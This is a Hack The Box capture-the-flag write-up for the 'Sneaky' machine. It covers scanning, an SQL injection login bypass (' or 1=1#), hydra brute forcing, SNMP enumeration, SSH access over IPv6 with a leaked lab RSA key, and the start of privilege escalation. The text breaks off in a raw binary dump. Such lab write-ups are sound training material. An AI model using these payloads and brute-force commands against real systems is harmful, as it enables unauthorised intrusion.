---
title: "Sneaky"
date: 2020-11-12T08:08:23+01:00
draft: false
summary: "This machine has thought me more about working with ipv6 how to calculate and it from its decimal number and it was a great bufer overflow example."
---



#### Machine Skills

-----

This machine has thought me more about working with ipv6 how to calculate and it from its decimal number and it was a great bufer overflow example.


#### Step 1 - Enumeration
-----

For the first step I started with normal enumeration through **nmap**
```bat
    TCP scan -> 

    nmap -sC -sV -oA sneaky 10.10.10.20
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-09 02:05 EST
    Nmap scan report for 10.10.10.20
    Host is up (0.088s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: Under Development!

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds
```
The first scan revealed a normal http service, after inspection it proved to be a broken webpage but I decided to further investigate with dirbuster and nikcto
```bat
    Nikto scan -> 
    kali@kali:~$ nikto -h 10.10.10.20
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.10.10.20
    + Target Hostname:    10.10.10.20
    + Target Port:        80
    + Start Time:         2020-11-09 02:23:46 (GMT-5)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.7 (Ubuntu)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                                                               

    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    + Server may leak inodes via ETags, header found with file /, inode: b7, size: 54eb1537f9bce, mtime: gzip
    + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
**+ OSVDB-3092: /dev/: This might be interesting...**
   
    + OSVDB-3233: /icons/README: Apache default file found.
    + 7864 requests: 0 error(s) and 8 item(s) reported on remote host
    + End Time:           2020-11-09 02:36:59 (GMT-5) (793 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested



    gobuster ->

    gobuster dir -w /usr/share/dirbuster/wordlists///directory-list-2.3-medium.txt -u http://10.10.10.20
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.20
    [+] Threads:        10
    [+] Wordlist:       /usr/share/dirbuster/wordlists///directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2020/11/09 03:08:38 Starting gobuster
    ===============================================================
**/dev (Status: 301)**

    Progress: 67259 / 220561 (30.49%)^C
    [!] Keyboard interrupt detected, terminating.
    ===============================================================
    2020/11/09 03:18:56 Finished

```
After inspection the first thing that popped out was the /dev directory that I had to inspect.

![/dev](/Sneaky/devFolder.png)
##### [Figure 1.1 - /dev] 

It was clear that this was a login page and some of the ideas that I had were to look to see if there is anything I can find using the developer tools maybe a .js or something in the html that would give away what to do next, sadly I could not find anything like that.

As a result I did another **nmap** scan this time an UDP scan to find more vulnerabilities. 
A note to self this UDP scan took a lot more than a normal scan.
```bat
    UDP scan -> (note to self udp scan takes a lot of time)
    sudo nmap -sU -A 10.10.10.20

    PORT    STATE SERVICE VERSION
**161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)**

    | snmp-info: 
    |   enterprise: net-snmp
    |   engineIDFormat: unknown
    |   engineIDData: fcf2da02d0831859
    |   snmpEngineBoots: 8
    |_  snmpEngineTime: 29m48s
    | snmp-interfaces: 
    |   lo
    |     IP address: 127.0.0.1  Netmask: 255.0.0.0
    |     Type: softwareLoopback  Speed: 10 Mbps
    |     Traffic stats: 0.00 Kb sent, 0.00 Kb received
    |   eth0
    |     IP address: 10.10.10.20  Netmask: 255.255.255.0
    |     MAC address: 00:50:56:b9:88:75 (VMware)
    |     Type: ethernetCsmacd  Speed: 4 Gbps
    |_    Traffic stats: 1.40 Mb sent, 952.29 Kb received
    ....
    a lot more useless text
    .....
    |   1188: 
    |     Name: apache2
    |     Path: /usr/sbin/apache2
    |     Params: -k start
    |   1223: 
    |     Name: getty
    |     Path: /sbin/getty
    |     Params: -8 38400 tty1
    |   1343: 
    |     Name: apache2
    |     Path: /usr/sbin/apache2
    |_    Params: -k start
    | snmp-sysdescr: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
    |_  System uptime: 29m48.00s (178800 timeticks)
    |_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
    Too many fingerprints match this host to give specific OS details
    Network Distance: 2 hops
    Service Info: Host: Sneaky

    TRACEROUTE (using port 32768/udp)
    HOP RTT      ADDRESS
    1   86.25 ms 10.10.14.1
    2   86.51 ms 10.10.10.20
```
I saw that there was an snmp port open but I did not know what snmp was luckly I was able to find a something useful on https://www.offensive-security.com/metasploit-unleashed/snmp-scan/ 

And I did some research on https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol
From what I could find it seems that SNMP is used to find information about organizing information about managed devices on IP networks and for modifying that information to change device behavior. This combined with the exploit that I found led me to believe that I can exploit this easily.

While searching for a method to exploit the SNMP method I tried several methods to exploit the previously found /dev URL.

---
### Step 2 -Exploitation
---


#### buirp

![format for attack](/Sneaky/BuirpIntercept.png)

##### [Figure 1.2 - format for ?credentials] 

I first tried intercepting a normal attempt to login with standard credentials, this revealed the format for the username and password nae=?&pass=?

#### wfuzz

My next line of thought was to use a fuzz attack
```bat
    wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/SQL.txt -d "name=admin&pass=Fuzz"  "http://10.10.10.20/dev"
```
sadly this did not give any useful results

#### hydra

Next I tried a dictionary attack hoping it's just a generic password
```bat
    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.20 -V http-form-post '/dev/login.php:name=^USER^&pass=^PASS^:Not Found'
    Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
```

I ran the for 20 minutes no results. I then concluded that this is not a good way to attack it.



#### sql bypass

Next I came back to the idea of an SQL injection so I switched to SQLmap. I believe my knowledge of this tool is not sufficient because running SQL map did not give me any results but manually trying some bypass sql injections worked in the end 
```bat
    kali@kali:~$ sqlmap -u "10.10.10.20/dev/"
            ___
        __H__                                                                                                                
    ___ ___["]_____ ___ ___  {1.4.7#stable}                                                                                    
    |_ -| . [,]     | .'| . |                                                                                                   
    |___|_  [.]_|_|_|__,|  _|                                                                                                   
        |_|V...       |_|   http://sqlmap.org                                                                                 

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 03:20:57 /2020-11-09/

    [03:20:57] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
    do you want to try URI injections in the target URL itself? [Y/n/q] y
    [03:20:59] [INFO] testing connection to the target URL
    [03:20:59] [INFO] testing if the target URL content is stable
    [03:20:59] [INFO] target URL content is stable
    [03:20:59] [INFO] testing if URI parameter '#1*' is dynamic
    [03:20:59] [WARNING] URI parameter '#1*' does not appear to be dynamic
    [03:21:00] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
    [03:21:00] [INFO] testing for SQL injection on URI parameter '#1*'
    [03:21:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [03:21:00] [WARNING] reflective value(s) found and filtering out
    [03:21:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
    [03:21:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
    [03:21:02] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
    [03:21:02] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
    [03:21:03] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
    [03:21:04] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
    [03:21:04] [INFO] testing 'Generic inline queries'
    [03:21:04] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
    [03:21:04] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
    [03:21:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
    [03:21:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [03:21:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
    [03:21:07] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
    [03:21:07] [INFO] testing 'Oracle AND time-based blind'
    it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
    [03:21:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [03:21:26] [WARNING] URI parameter '#1*' does not seem to be injectable
    [03:21:26] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
    [03:21:26] [WARNING] HTTP error codes detected during run:
    404 (Not Found) - 124 times

    [*] ending @ 03:21:26 /2020-11-09/
```

Next I tried inserting the sql injections by hand which worked. 


![foothold](/Sneaky/SqlInjection.png)
##### [Figure 1.3 - sql injection by hand] 


I tried everything in https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ - 
SQL Injection 101, Login tricks
```bat
    user  admin
    password : ' or 1=1#
```
In my key I found an RSA key for ssh. the problem was that there was no SSH port open => this lead me to believe I could ssh using the snmp port

---
### Step 3 - Foothold
---
```bat
        -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
    Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
    3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
    yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
    cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
    oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
    Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
    h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
    CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
    OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
    I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
    JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
    5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
    ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
    +jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
    7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
    GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
    aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
    VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
    hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
    1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
    LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
    UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
    Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
    rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
    -----END RSA PRIVATE KEY-----
```
Before anything I tried the exploit found for snmp with metasploit but that did not enable anything
```bat
                                    ____________
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
    [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
    [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
    [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


        =[ metasploit v5.0.99-dev                          ]
    + -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
    + -- --=[ 562 payloads - 45 encoders - 10 nops            ]
    + -- --=[ 7 evasion                                       ]

    Metasploit tip: View all productivity tips with the tips command

    msf5 > search snmp

    Matching Modules
    ================

    #   Name                                                 Disclosure Date  Rank       Check  Description
    -   ----                                                 ---------------  ----       -----  -----------
    0   auxiliary/admin/networking/cisco_asa_extrabacon                       normal     Yes    Cisco ASA Authentication Bypass (EXTRABACON)
    1   auxiliary/admin/scada/moxa_credentials_recovery      2015-07-28       normal     Yes    Moxa Device Credential Retrieval
    2   auxiliary/scanner/misc/oki_scanner                                    normal     No     OKI Printer Default Login Credential Scanner
    3   auxiliary/scanner/snmp/aix_version                                    normal     No     AIX SNMP Scanner Auxiliary Module
    4   auxiliary/scanner/snmp/arris_dg950                                    normal     No     Arris DG950A Cable Modem Wifi Enumeration                                                                                                                
    5   auxiliary/scanner/snmp/brocade_enumhash                               normal     No     Brocade Password Hash Enumeration
    6   auxiliary/scanner/snmp/cisco_config_tftp                              normal     No     Cisco IOS SNMP Configuration Grabber (TFTP)
    7   auxiliary/scanner/snmp/cisco_upload_file                              normal     No     Cisco IOS SNMP File Upload (TFTP)
    8   auxiliary/scanner/snmp/cnpilot_r_snmp_loot                            normal     No     Cambium cnPilot r200/r201 SNMP Enumeration                                                                                                               
    9   auxiliary/scanner/snmp/epmp1000_snmp_loot                             normal     No     Cambium ePMP 1000 SNMP Enumeration
    10  auxiliary/scanner/snmp/netopia_enum                                   normal     No     Netopia 3347 Cable Modem Wifi Enumeration
    11  auxiliary/scanner/snmp/sbg6580_enum                                   normal     No     ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module
    12  auxiliary/scanner/snmp/snmp_enum                                      normal     No     SNMP Enumeration Module
    13  auxiliary/scanner/snmp/snmp_enum_hp_laserjet                          normal     No     HP LaserJet Printer SNMP Enumeration
    14  auxiliary/scanner/snmp/snmp_enumshares                                normal     No     SNMP Windows SMB Share Enumeration
    15  auxiliary/scanner/snmp/snmp_enumusers                                 normal     No     SNMP Windows Username Enumeration
    16  auxiliary/scanner/snmp/snmp_login                                     normal     No     SNMP Community Login Scanner
    17  auxiliary/scanner/snmp/snmp_set                                       normal     No     SNMP Set Module
    18  auxiliary/scanner/snmp/ubee_ddw3611                                   normal     No     Ubee DDW3611b Cable Modem Wifi Enumeration
    19  auxiliary/scanner/snmp/xerox_workcentre_enumusers                     normal     No     Xerox WorkCentre User Enumeration (SNMP)
    20  exploit/linux/misc/hp_jetdirect_path_traversal       2017-04-05       normal     No     HP Jetdirect Path Traversal Arbitrary Code Execution
    21  exploit/linux/snmp/awind_snmp_exec                   2019-03-27       excellent  Yes    AwindInc SNMP Service Command Injection
    22  exploit/linux/snmp/net_snmpd_rw_access               2004-05-10       normal     No     Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution
    23  exploit/multi/http/hp_sys_mgmt_exec                  2013-06-11       excellent  Yes    HP System Management Homepage JustGetSNMPQueue Command Injection
    24  exploit/windows/ftp/oracle9i_xdb_ftp_unlock          2003-08-18       great      Yes    Oracle 9i XDB FTP UNLOCK Overflow (win32)
    25  exploit/windows/http/hp_nnm_ovwebsnmpsrv_main        2010-06-16       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
    26  exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil      2010-06-16       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
    27  exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro         2010-06-08       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
    28  exploit/windows/http/hp_nnm_snmp                     2009-12-09       great      No     HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
    29  exploit/windows/http/hp_nnm_snmpviewer_actapp        2010-05-11       great      No     HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
    30  exploit/windows/scada/sunway_force_control_netdbsrv  2011-09-22       great      No     Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57
    31  post/windows/gather/enum_snmp                                         normal     No     Windows Gather SNMP Settings Enumeration (Registry)


    Interact with a module by name or index, for example use 31 or use post/windows/gather/enum_snmp

    msf5 > search snmp

    Matching Modules
    ================

    #   Name                                                 Disclosure Date  Rank       Check  Description
    -   ----                                                 ---------------  ----       -----  -----------
    0   auxiliary/admin/networking/cisco_asa_extrabacon                       normal     Yes    Cisco ASA Authentication Bypass (EXTRABACON)
    1   auxiliary/admin/scada/moxa_credentials_recovery      2015-07-28       normal     Yes    Moxa Device Credential Retrieval
    2   auxiliary/scanner/misc/oki_scanner                                    normal     No     OKI Printer Default Login Credential Scanner
    3   auxiliary/scanner/snmp/aix_version                                    normal     No     AIX SNMP Scanner Auxiliary Module
    4   auxiliary/scanner/snmp/arris_dg950                                    normal     No     Arris DG950A Cable Modem Wifi Enumeration
    5   auxiliary/scanner/snmp/brocade_enumhash                               normal     No     Brocade Password Hash Enumeration
    6   auxiliary/scanner/snmp/cisco_config_tftp                              normal     No     Cisco IOS SNMP Configuration Grabber (TFTP)
    7   auxiliary/scanner/snmp/cisco_upload_file                              normal     No     Cisco IOS SNMP File Upload (TFTP)
    8   auxiliary/scanner/snmp/cnpilot_r_snmp_loot                            normal     No     Cambium cnPilot r200/r201 SNMP Enumeration
    9   auxiliary/scanner/snmp/epmp1000_snmp_loot                             normal     No     Cambium ePMP 1000 SNMP Enumeration
    10  auxiliary/scanner/snmp/netopia_enum                                   normal     No     Netopia 3347 Cable Modem Wifi Enumeration
    11  auxiliary/scanner/snmp/sbg6580_enum                                   normal     No     ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module
    12  auxiliary/scanner/snmp/snmp_enum                                      normal     No     SNMP Enumeration Module
    13  auxiliary/scanner/snmp/snmp_enum_hp_laserjet                          normal     No     HP LaserJet Printer SNMP Enumeration
    14  auxiliary/scanner/snmp/snmp_enumshares                                normal     No     SNMP Windows SMB Share Enumeration
    15  auxiliary/scanner/snmp/snmp_enumusers                                 normal     No     SNMP Windows Username Enumeration
    16  auxiliary/scanner/snmp/snmp_login                                     normal     No     SNMP Community Login Scanner
    17  auxiliary/scanner/snmp/snmp_set                                       normal     No     SNMP Set Module
    18  auxiliary/scanner/snmp/ubee_ddw3611                                   normal     No     Ubee DDW3611b Cable Modem Wifi Enumeration
    19  auxiliary/scanner/snmp/xerox_workcentre_enumusers                     normal     No     Xerox WorkCentre User Enumeration (SNMP)
    20  exploit/linux/misc/hp_jetdirect_path_traversal       2017-04-05       normal     No     HP Jetdirect Path Traversal Arbitrary Code Execution
    21  exploit/linux/snmp/awind_snmp_exec                   2019-03-27       excellent  Yes    AwindInc SNMP Service Command Injection
    22  exploit/linux/snmp/net_snmpd_rw_access               2004-05-10       normal     No     Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution
    23  exploit/multi/http/hp_sys_mgmt_exec                  2013-06-11       excellent  Yes    HP System Management Homepage JustGetSNMPQueue Command Injection
    24  exploit/windows/ftp/oracle9i_xdb_ftp_unlock          2003-08-18       great      Yes    Oracle 9i XDB FTP UNLOCK Overflow (win32)
    25  exploit/windows/http/hp_nnm_ovwebsnmpsrv_main        2010-06-16       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe main Buffer Overflow
    26  exploit/windows/http/hp_nnm_ovwebsnmpsrv_ovutil      2010-06-16       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow
    27  exploit/windows/http/hp_nnm_ovwebsnmpsrv_uro         2010-06-08       great      No     HP OpenView Network Node Manager ovwebsnmpsrv.exe Unrecognized Option Buffer Overflow
    28  exploit/windows/http/hp_nnm_snmp                     2009-12-09       great      No     HP OpenView Network Node Manager Snmp.exe CGI Buffer Overflow
    29  exploit/windows/http/hp_nnm_snmpviewer_actapp        2010-05-11       great      No     HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow
    30  exploit/windows/scada/sunway_force_control_netdbsrv  2011-09-22       great      No     Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57
    31  post/windows/gather/enum_snmp                                         normal     No     Windows Gather SNMP Settings Enumeration (Registry)
```

    Interact with a module by name or index, for example use 31 or use post/windows/gather/enum_snmp
```bat
    msf5 > use auxiliary/scanner/snmp/snmp_login 
    msf5 auxiliary(scanner/snmp/snmp_login) > show options

    Module options (auxiliary/scanner/snmp/snmp_login):

    Name              Current Setting                                                       Required  Description
    ----              ---------------                                                       --------  -----------
    BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
    BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
    DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
    DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
    DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
    PASSWORD                                                                                no        The password to test
    PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
    RHOSTS                                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT             161                                                                   yes       The target port
    STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
    THREADS           1                                                                     yes       The number of concurrent threads (max one per host)
    USER_AS_PASS      false                                                                 no        Try the username as the password for all users
    VERBOSE           true                                                                  yes       Whether to print output for all attempts
    VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

    msf5 auxiliary(scanner/snmp/snmp_login) > set RHOSTS 10.10.10.20
    RHOSTS => 10.10.10.20
    msf5 auxiliary(scanner/snmp/snmp_login) > run

    [+] 10.10.10.20:161 - Login Successful: public (Access level: read-only); Proof (sysDescr.0): Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```
I also found a tool made by the creator of the box that allows you to use snmp to get the ipv6 address that you can login with ssh through because ssh was only blocked on ipv4 not on ipv6 something that appears to be a common mistake.

```bat
    python enyx.py 2c public 10.10.10.20
    ###################################################################################
    #                                                                                 #
    #                      #######     ##      #  #    #  #    #                      #
    #                      #          #  #    #    #  #    #  #                       #
    #                      ######    #   #   #      ##      ##                        #
    #                      #        #    # #        ##     #  #                       #
    #                      ######  #     ##         ##    #    #                      #
    #                                                                                 #
    #                           SNMP IPv6 Enumerator Tool                             #
    #                                                                                 #
    #                   Author: Thanasis Tserpelis aka Trickster0                     #
    #                                                                                 #
    ###################################################################################


    [+] Snmpwalk found.
    [+] Grabbing IPv6.
    [+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
**[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:8875**

    [+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:8875
    kali@kali:~/Documents/HackTheBox/Sneaky/Enyx$ cd ..
    kali@kali:~/Documents/HackTheBox/Sneaky$ ssh -i id_rsa thrasivoulos@fe80:0000:0000:0000:0250:56ff:feb9:8875
    ssh: connect to host fe80::250:56ff:feb9:8875 port 22: Invalid argument
    kali@kali:~/Documents/HackTheBox/Sneaky$ mv id_rsa ssh.key
    kali@kali:~/Documents/HackTheBox/Sneaky$ chmod 600 ssh.key
    kali@kali:~/Documents/HackTheBox/Sneaky$ ssh -i id_rsa thrasivoulos@fe80:0000:0000:0000:0250:56ff:feb9:8875
    Warning: Identity file id_rsa not accessible: No such file or directory.
    ssh: connect to host fe80::250:56ff:feb9:8875 port 22: Invalid argument
    kali@kali:~/Documents/HackTheBox/Sneaky$ ssh -i ssh.key thrasivoulos@fe80:0000:0000:0000:0250:56ff:feb9:8875
    ssh: connect to host fe80::250:56ff:feb9:8875 port 22: Invalid argument
    
**kali@kali:~/Documents/HackTheBox/Sneaky$ ssh -i ssh.key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:8875**

    load pubkey "ssh.key": invalid format
    The authenticity of host 'dead:beef::250:56ff:feb9:8875 (dead:beef::250:56ff:feb9:8875)' can't be established.
    ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added 'dead:beef::250:56ff:feb9:8875' (ECDSA) to the list of known hosts.
    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

    * Documentation:  https://help.ubuntu.com/

    System information as of Mon Nov  9 09:00:53 EET 2020

    System load: 0.0               Memory usage: 4%   Processes:       177
    Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

    Graph this data and manage this system at:
        https://landscape.canonical.com/

    Your Hardware Enablement Stack (HWE) is supported until April 2019.
    Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
**thrasivoulos@Sneaky:~$**


    thrasivoulos@Sneaky:~$ whoami
    thrasivoulos
    thrasivoulos@Sneaky:~$ ls
    user.txt
    thrasivoulos@Sneaky:~$ cat user.txt 
    9fe14f76222db23a770f20136751bdab
    thrasivoulos@Sneaky:~$ 
```
---
### Step 4 - Privilage Escalation
---

Now that I had acces to the machine I tried the standar sudo su and trying to access root but it was password protected. After taking a look online I found this command that pointed to a faulty binary that could be exploited with a buffer overflow.
```bat
    find / -perm -4000 2>/dev/null
Command to find all files with 4000 permissions (admin)
```

I took the file and sent it to my own machine 
```bat
    thrasivoulos@Sneaky:/usr/local/bin$ ls
    chal
    thrasivoulos@Sneaky:/usr/local/bin$ cat chal 
    ELF 4T4         (44  TT▒��hhhDDP�td���,,Q�tdR��/lib/ld-linux.so.2GNU▒GNU���oϯ���▒e"-h[{  �K��▒3 !
    B��                                                                                              libc.so.6_IO_stdin_usedstrcpy__libc_start_main__gmon_start__GLIBC_2.0ii
    S�����C��������t�.�[��5��%
                                h������%������%h�����1�^�����PTRh�hPQVh������f�f�f�f�f�f�f��$�f�f�f�f�f�f��#- ��wø��t�U����▒�$ ���Í�� - ���������uú��t�U����▒�D$�$ ���É���'�= uU����|���� ���f����t���tU����▒�$����y�����s���U�������p�E
                                            ����D$�D$�$��������f�f�f�f�UW1�VS������å��l$0��
    ���������������S��������3[�(���D=���hp���������zR|                                      ����A�������)�����t'���D$8�,$�D�D$4�D$�������9�u߃�[^_]��
                                                    ����F
                                                        J
    g�                                                      tx?▒;*2$"@����+�B
    8`����a�A
            �C�A�N0HA�A�
                        AA������Ѓ
    ▒                              ��
    ���o��
    L
    ▒���ot���o���oh�GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.3) 4.8.4.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.got.plt.data.bss.commentT#hh 1��$D���o�� N
